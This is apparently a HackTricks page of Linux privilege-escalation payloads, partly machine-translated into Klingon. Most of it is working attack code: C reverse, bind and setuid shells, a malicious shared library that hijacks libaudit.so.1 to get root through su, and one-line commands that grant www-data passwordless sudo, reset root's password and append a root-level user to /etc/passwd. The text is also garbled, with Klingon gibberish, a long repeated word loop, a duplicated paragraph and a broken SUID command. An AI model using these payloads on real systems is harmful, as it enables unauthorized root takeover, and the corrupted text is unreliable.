# Payloads to execute

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Bash
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
# C

### Payloads to Execute

#### Shell

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    system("/bin/sh");
    return 0;
}
```

#### Reverse Shell

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

int main() {
    int sockfd;
    struct sockaddr_in server;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    server.sin_addr.s_addr = inet_addr("127.0.0.1");

    connect(sockfd, (struct sockaddr *)&server, sizeof(server));
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    execve("/bin/sh", NULL, NULL);

    return 0;
}
```

#### Bind Shell

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

int main() {
    int sockfd, clientfd;
    struct sockaddr_in server, client;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    server.sin_addr.s_addr = INADDR_ANY;

    bind(sockfd, (struct sockaddr *)&server, sizeof(server));
    listen(sockfd, 0);

    clientfd = accept(sockfd, (struct sockaddr *)&client, sizeof(client));
    dup2(clientfd, 0);
    dup2(clientfd, 1);
    dup2(clientfd, 2);

    execve("/bin/sh", NULL, NULL);

    return 0;
}
```

#### Setuid Shell

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    system("/bin/sh");
    return 0;
}
```

#### Setuid Reverse Shell

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

int main() {
    int sockfd;
    struct sockaddr_in server;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    server.sin_addr.s_addr = inet_addr("127.0.0.1");

    connect(sockfd, (struct sockaddr *)&server, sizeof(server));
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    setuid(0);
    execve("/bin/sh", NULL, NULL);

    return 0;
}
```

#### Setuid Bind Shell

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

int main() {
    int sockfd, clientfd;
    struct sockaddr_in server, client;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    server.sin_addr.s_addr = INADDR_ANY;

    bind(sockfd, (struct sockaddr *)&server, sizeof(server));
    listen(sockfd, 0);

    clientfd = accept(sockfd, (struct sockaddr *)&client, sizeof(client));
    dup2(clientfd, 0);
    dup2(clientfd, 1);
    dup2(clientfd, 2);

    setuid(0);
    execve("/bin/sh", NULL, NULL);

    return 0;
}
```

#### SUID Binary

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    system("/bin/bash -p");
    return 0;
}
```

#### SUID Binary with Password

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    system("echo 'password' | /bin/bash -p");
    return 0;
}
```

#### SUID Binary with Custom Password

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    system("echo 'custom_password' | /bin/bash -p");
    return 0;
}
```

#### SUID Binary with Encrypted Password

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    system("echo -n 'encrypted_password' | base64 -d | /bin/bash -p");
    return 0;
}
```

#### SUID Binary with Custom Encrypted Password

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    system("echo -n 'custom_encrypted_password' | base64 -d | /bin/bash -p");
    return 0;
}
```

#### SUID Binary with Encrypted Password (AES-256-CBC)

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    system("echo -n 'encrypted_password' | openssl aes-256-cbc -d -a -salt -pass pass:'password' | /bin/bash -p");
    return 0;
}
```

#### SUID Binary with Custom Encrypted Password (AES-256-CBC)

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    system("echo -n 'custom_encrypted_password' | openssl aes-256-cbc -d -a -salt -pass pass:'custom_password' | /bin/bash -p");
    return 0;
}
```
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## qoHwI' DaH jImej

### qoHwI' HaSta

* _/etc/passwd_ vItlhutlh user password
* _/etc/shadow_ vItlhutlh user password
* _/etc/sudoers_ vItlhutlh user sudoers
* _/run/docker.sock_ yIlo' _/var/run/docker.sock_ Daq abuse docker

### qoHwI' DaH jImej

`/bin/su` Daq binary vItlhutlh library vItlhutlh:
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
In this case lets try to impersonate `/lib/x86_64-linux-gnu/libaudit.so.1`.\
So, check for functions of this library used by the **`su`** binary:
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
The symbols `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` and `audit_fd` are probably from the libaudit.so.1 library. As the libaudit.so.1 will be overwritten by the malicious shared library, these symbols should be present in the new shared library, otherwise the program will not be able to find the symbol and will exit.

---

The symbols `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` and `audit_fd` are probably from the libaudit.so.1 library. As the libaudit.so.1 will be overwritten by the malicious shared library, these symbols should be present in the new shared library, otherwise the program will not be able to find the symbol and will exit.
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
NuqneH, **`/bin/su`** jImejDaq 'ej root jImej.

## Scripts

root qachDaq 'oH ghaH?

### **www-data to sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **Qa'legh 'ej root password**
```bash
echo "root:hacked" | chpasswd
```
### Add new root user to /etc/passwd

#### English:

To add a new root user to the `/etc/passwd` file, you can follow these steps:

1. Open the `/etc/passwd` file using a text editor.
2. Locate the line that starts with `root` and copy it.
3. Paste the copied line at the end of the file.
4. Modify the username and user ID (UID) of the new root user as desired.
5. Save the changes and exit the text editor.

Please note that modifying system files like `/etc/passwd` can have serious consequences, and it should only be done with proper authorization and understanding of the potential risks involved.

#### Klingon:

`/etc/passwd` file vItlhutlh root user chelwI' chaw'bej:

1. Text editor vItlhutlh `/etc/passwd` file.
2. 'root' jatlhlaHbe' line vItlhutlh je.
3. line vItlhutlh vItlhutlh file pIm.
4. username je je user ID (UID) vItlhutlh root user.
5. vItlhutlh je je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vItlhutlh je vIt
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
